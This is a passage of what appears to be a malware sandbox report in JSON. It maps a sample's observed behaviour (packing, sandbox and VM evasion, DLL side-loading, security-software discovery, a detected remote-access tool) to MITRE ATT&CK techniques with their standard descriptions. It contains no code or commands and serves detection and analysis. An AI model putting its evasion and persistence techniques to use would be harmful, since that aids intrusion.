                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Find Crypto"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Strings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/002/",
                "id": "T1027.002",
                "name": "Software Packing"
              },
              {
                "description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Detected an attempt to pull out some data from the binary image"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1140/",
                "id": "T1140",
                "name": "Deobfuscate/Decode Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\nThe deprecated at utility could also be abused by adversaries (ex: At), though at.exe can not access tasks created with schtasks or the Control Panel.\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from schtasks /query and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., Index value) within associated registry keys. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Find Crypto"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Strings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/005/",
                "id": "T1053.005",
                "name": "Scheduled Task"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Public key (encryption) found"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1560/",
                "id": "T1560",
                "name": "Archive Collected Data"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to move through your environment.\n\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. ",
            "techniques": [
              {
                "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\nMobile devices may also be used to infect PCs with malware if connected via USB. This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Checks for available system drives (often done to infect USB drives)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1091/",
                "id": "T1091",
                "name": "Replication Through Removable Media"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0008/",
            "id": "TA0008",
            "name": "Lateral Movement"
          },
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to get into your network.\n\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.",
            "techniques": [
              {
                "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\nMobile devices may also be used to infect PCs with malware if connected via USB. This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Checks for available system drives (often done to infect USB drives)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1091/",
                "id": "T1091",
                "name": "Replication Through Removable Media"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0001/",
            "id": "TA0001",
            "name": "Initial Access"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "AV process strings found (often used to terminate AV products)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to detect sandboxes and other dynamic analysis tools"
                  },
                  {
                    "severity": "INFO",
                    "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Query firmware table information (likely to detect VMs)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.\nAdversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads the hosts file"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1018/",
                "id": "T1018",
                "name": "Remote System Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries a list of all running processes"
                  },
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample monitors Window changes (e.g. starting applications), analyze the sample with the simulation cookbook"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1010/",
                "id": "T1010",
                "name": "Application Window Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Monitors certain registry keys / values for changes (often done to protect autostart functionality)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries the product ID of Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks the free space of harddrives"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the cryptographic machine GUID"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the installation date of Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads ini files"
                  },
                  {
                    "severity": "INFO",
                    "description": "Writes ini files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Checks for available system drives (often done to infect USB drives)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Sample is looking for USB drives. Launch the sample with the USB Fake Disk cookbook"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1120/",
                "id": "T1120",
                "name": "Peripheral Device Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "LOW",
                    "description": "Query firmware table information (likely to detect VMs)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains medium sleeps (>= 30s)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as VNC, Team Viewer, AnyDesk, ScreenConnect, LogMein, AmmyyAdmin, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a Windows Service).",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "Detected Remote Utilities RAT"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1219/",
                "id": "T1219",
                "name": "Remote Access Software"
              },
              {
                "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Detected TCP or UDP traffic on non-standard ports"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1571/",
                "id": "T1571",
                "name": "Non-Standard Port"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Drops PE files to the windows directory (C:\\\\Windows)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the program directory"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the system directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Stores large binary data to the registry"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1112/",
                "id": "T1112",
                "name": "Modify Registry"
              },
              {
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging. \nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Launches processes in debugging mode, may be used to hinder debugging"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1562/001/",
                "id": "T1562.001",
                "name": "Disable or Modify Tools"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "LOW",
                    "description": "Query firmware table information (likely to detect VMs)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains medium sleeps (>= 30s)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "File is packed with WinRar"
                  },
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/002/",
                "id": "T1027.002",
                "name": "Software Packing"
              },
              {
                "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Deletes files inside the Windows folder"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/004/",
                "id": "T1070.004",
                "name": "File Deletion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
